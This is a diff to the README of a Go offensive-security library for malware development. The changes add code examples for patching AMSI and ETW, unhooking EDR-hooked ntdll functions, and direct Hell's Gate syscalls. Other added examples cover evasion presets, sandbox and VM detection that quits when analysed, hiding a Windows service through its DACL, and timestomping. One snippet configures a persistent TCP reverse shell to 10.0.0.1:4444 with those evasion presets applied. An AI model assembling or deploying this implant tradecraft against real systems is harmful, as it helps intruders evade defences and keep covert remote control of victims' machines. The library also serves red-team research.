@@ -4,7 +4,7 @@ Modular malware development library in Go for offensive security research and re
 
 ## Overview
 
-maldev is a single-module Go library that provides composable building blocks for implant development, shellcode injection, defense evasion, and command-and-control infrastructure. The library is organized into layered packages with clear dependency boundaries: pure cryptographic utilities at the bottom, Windows API primitives in the middle, and high-level techniques (evasion, injection, C2) at the top. Every technique package includes MITRE ATT&CK mappings, detection-level ratings, and cross-platform support where applicable.
+maldev is a workspace-based Go library that provides composable building blocks for implant development, shellcode injection, defense evasion, and command-and-control infrastructure. The library is organized into layered packages with clear dependency boundaries: pure cryptographic utilities at the bottom, Windows API primitives in the middle, and high-level techniques (evasion, injection, C2) at the top. Every technique package includes MITRE ATT&CK mappings, detection-level ratings, and cross-platform support where applicable.
 
 ## Architecture
 
@@ -148,6 +148,7 @@ func main() {
 | `evasion/antivm` | VM/hypervisor detection | T1497.001 -- System Checks | Low | Cross-platform |
 | `evasion/timing` | CPU-burning delays | T1497.003 -- Time Based Evasion | Low | Cross-platform |
 | `evasion/sandbox` | Multi-factor sandbox detection | T1497 -- Sandbox Evasion | Low | Cross-platform |
+| `evasion/preset` | Composable technique presets (Minimal/Stealth/Aggressive) | -- | -- | Windows |
 
 <details>
 <summary><strong>AMSI Bypass</strong> (<code>evasion/amsi</code>)</summary>
@@ -235,14 +236,133 @@ Aggregates multiple environment checks into a single assessment: debugger detect
 ```go
 import "github.com/oioio-space/maldev/evasion/sandbox"
 
-checker := sandbox.NewCheckerDefault()
-if sandboxed, reason, _ := checker.IsSandboxed(); sandboxed {
+checker := sandbox.New(sandbox.DefaultConfig())
+if sandboxed, reason, _ := checker.IsSandboxed(ctx); sandboxed {
     os.Exit(0) // bail out of sandbox
 }
 ```
 
 **Advantages:** Multi-factor detection reduces false negatives.
 **Limitations:** Combined behavior pattern may itself be flagged by advanced sandboxes.
+
+</details>
+
+<details>
+<summary><strong>Composable Evasion</strong> (<code>evasion/preset</code>)</summary>
+
+Evasion techniques implement the `evasion.Technique` interface and can be composed into slices for batch application. Three presets are provided for common scenarios.
+
+```go
+import (
+    "github.com/oioio-space/maldev/c2/shell"
+    "github.com/oioio-space/maldev/evasion"
+    "github.com/oioio-space/maldev/evasion/amsi"
+    "github.com/oioio-space/maldev/evasion/etw"
+    "github.com/oioio-space/maldev/evasion/preset"
+    "github.com/oioio-space/maldev/evasion/unhook"
+    wsyscall "github.com/oioio-space/maldev/win/syscall"
+)
+
+// Presets — ready to use
+cfg := &shell.Config{
+    Evasion: preset.Stealth(), // AMSI + ETW + unhook common functions
+}
+
+// Custom composition
+cfg = &shell.Config{
+    Evasion: []evasion.Technique{
+        amsi.ScanBufferPatch(),
+        etw.All(),
+        unhook.Classic("NtAllocateVirtualMemory"),
+        unhook.Classic("NtCreateThreadEx"),
+    },
+}
+
+// With direct syscalls for maximum stealth
+caller := wsyscall.New(wsyscall.MethodDirect, wsyscall.NewHellsGate())
+evasion.ApplyAll(preset.Stealth(), caller)
+```
+
+| Preset | Techniques | Detection Risk |
+|--------|-----------|----------------|
+| `preset.Minimal()` | AMSI + ETW | Low |
+| `preset.Stealth()` | + unhook 10 common NT functions | Medium |
+| `preset.Aggressive()` | + full ntdll unhook + ACG + BlockDLLs | High |
+
+</details>
+
+<details>
+<summary><strong>Hook Detection</strong> (<code>evasion/unhook</code>)</summary>
+
+Detect which ntdll functions have been hooked by EDR and inspect their prologues.
+
+```go
+import "github.com/oioio-space/maldev/evasion/unhook"
+
+// Detect which functions are hooked by EDR
+hooked, _ := unhook.DetectHooked(unhook.CommonHookedFunctions)
+fmt.Println("Hooked:", hooked)
+
+// Inspect prologues
+infos, _ := unhook.Inspect(unhook.CommonHookedFunctions)
+for _, info := range infos {
+    status := "clean"
+    if info.Hooked { status = "HOOKED" }
+    fmt.Printf("%-30s %s  %02X\n", info.Name, status, info.Prologue)
+}
+```
+
+</details>
+
+<details>
+<summary><strong>AntiVM — Parameterizable Config</strong> (<code>evasion/antivm</code>)</summary>
+
+VM detection supports bitmask-based check selection for fine-grained control over which detection dimensions to evaluate.
+
+```go
+import "github.com/oioio-space/maldev/evasion/antivm"
+
+// Default: check everything
+vendor := antivm.DetectVM()
+
+// Custom: only check processes and CPUID (fast, no disk access)
+cfg := antivm.Config{
+    Checks: antivm.CheckProcess | antivm.CheckCPUID,
+}
+vendor, _ := antivm.Detect(cfg)
+
+// Detect ALL matching vendors
+vendors, _ := antivm.DetectAll(antivm.DefaultConfig())
+```
+
+</details>
+
+<details>
+<summary><strong>Sandbox Detection — Parameterizable Config</strong> (<code>evasion/sandbox</code>)</summary>
+
+Multi-factor sandbox detection with tunable thresholds and check behavior.
+
+```go
+import "github.com/oioio-space/maldev/evasion/sandbox"
+
+// Quick check
+checker := sandbox.New(sandbox.DefaultConfig())
+detected, reason, _ := checker.IsSandboxed(ctx)
+
+// Detailed results
+results := checker.CheckAll(ctx)
+for _, r := range results {
+    if r.Detected {
+        fmt.Printf("[!] %s: %s\n", r.Name, r.Detail)
+    }
+}
+
+// Custom config
+cfg := sandbox.DefaultConfig()
+cfg.MinRAMGB = 8
+cfg.StopOnFirst = false
+cfg.BadProcesses = append(cfg.BadProcesses, "custom-analyzer")
+```
 
 </details>
 
@@ -312,7 +432,7 @@ injector.Inject(shellcode)
 
 | Package | Description | MITRE ATT&CK | Platform |
 |---------|-------------|---------------|----------|
-| `process/enum` | Process enumeration by name or PID | -- | Cross-platform |
+| `process/enum` | Process enumeration by name or PID | T1057 -- Process Discovery | Cross-platform |
 | `process/session` | Cross-session process creation and impersonation | T1134.002 -- Create Process with Token | Windows |
 
 ```go
@@ -354,6 +474,7 @@ shellcode, err := srdi.ConvertDLL("payload.dll", cfg)
 ```go
 import (
     "github.com/oioio-space/maldev/cleanup/selfdelete"
+    "github.com/oioio-space/maldev/cleanup/service"
     "github.com/oioio-space/maldev/cleanup/wipe"
     "github.com/oioio-space/maldev/cleanup/timestomp"
 )
@@ -366,6 +487,12 @@ err = wipe.File("/tmp/artifact.bin", 3)
 
 // Clone timestamps from a reference file
 err = timestomp.CopyFrom("C:\\Windows\\System32\\kernel32.dll", "implant.exe")
+
+// Hide a service (restrict DACL)
+output, _ := service.HideService(service.Native, "", "MyService")
+
+// Restore default DACL
+output, _ = service.UnHideService(service.Native, "", "MyService")
 ```
 
 ### Command and Control (`c2/`)
@@ -384,6 +511,7 @@ import (
 
     "github.com/oioio-space/maldev/c2/shell"
     "github.com/oioio-space/maldev/c2/transport"
+    "github.com/oioio-space/maldev/evasion/preset"
 )
 
 trans := transport.NewTCP("10.0.0.1:4444", 10*time.Second)
@@ -391,10 +519,7 @@ trans := transport.NewTCP("10.0.0.1:4444", 10*time.Second)
 cfg := &shell.Config{
     MaxRetries:    0, // unlimited reconnection
     ReconnectWait: 5 * time.Second,
-    Evasion: &shell.EvasionConfig{
-        PatchAMSI: true,
-        PatchETW:  true,
-    },
+    Evasion:       preset.Stealth(), // AMSI + ETW + unhook common functions
 }
 
 sh := shell.New(trans, cfg)
@@ -492,6 +617,7 @@ All technique packages that accept a `*wsyscall.Caller` parameter treat `nil` as
 | T1027.002 | Obfuscated Files: Software Packing | `pe/morph` |
 | T1055 | Process Injection | `inject` |
 | T1055.001 | Process Injection: DLL Injection | `pe/srdi` |
+| T1057 | Process Discovery | `process/enum` |
 | T1059 | Command and Scripting Interpreter | `c2/shell`, `c2/meterpreter` |
 | T1070.004 | Indicator Removal: File Deletion | `cleanup/selfdelete`, `cleanup/wipe` |
 | T1070.006 | Indicator Removal: Timestomp | `cleanup/timestomp` |
@@ -555,6 +681,7 @@ maldev/
 |   +-- antivm/            VM/hypervisor detection
 |   +-- timing/            CPU-burning time delays
 |   +-- sandbox/           Multi-factor sandbox detection
+|   +-- preset/            Composable technique presets
 +-- inject/                Shellcode injection (8 Win + 5 Linux methods)
 +-- process/
 |   +-- enum/              Cross-platform process enumeration
